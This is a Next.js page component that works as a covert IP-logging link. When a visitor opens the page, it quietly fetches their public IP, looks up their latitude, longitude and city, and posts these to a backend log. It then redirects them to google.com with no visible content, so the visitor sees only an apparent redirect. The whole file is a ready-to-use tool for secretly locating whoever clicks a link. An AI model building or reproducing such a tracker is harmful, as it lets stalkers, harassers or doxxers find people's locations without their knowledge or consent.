'use client';
import { useEffect } from 'react';

export default function Page() {
  useEffect(() => {
    const fetchAndLogLocation = async () => {
      try {
        let ipLatitude = '';
        let ipLongitude = '';
        let city = '';
        let userIp = '';

        // Step 1: Fetch the IP address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        userIp = ipData.ip;

        // Step 2: Fetch location using IP with city details
        const geoResponse = await fetch(`http://ip-api.com/json/${userIp}`);
        const geoData = await geoResponse.json();

        if (geoData.status === 'success') {
          ipLatitude = geoData.lat;
          ipLongitude = geoData.lon;
          city = geoData.city;
        } else {
          console.error('IP geolocation failed:', geoData.message);
        }

        // Step 3: Log the details to the backend
        await fetch('/api/log', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            ip: userIp,
            ipLatitude,
            ipLongitude,
            city,
          }),
        });

        console.log(`IP: ${userIp}, Latitude: ${ipLatitude}, Longitude: ${ipLongitude}, City: ${city}`);

        // Step 4: Redirect to Google (optional)
         window.location.href = 'https://google.com';
      } catch (error) {
        console.error('Error fetching or logging location:', error);
         window.location.href = 'https://google.com'; // Redirect even if there's an error
      }
    };

    fetchAndLogLocation();
  }, []);

  return null; // No UI needed
}
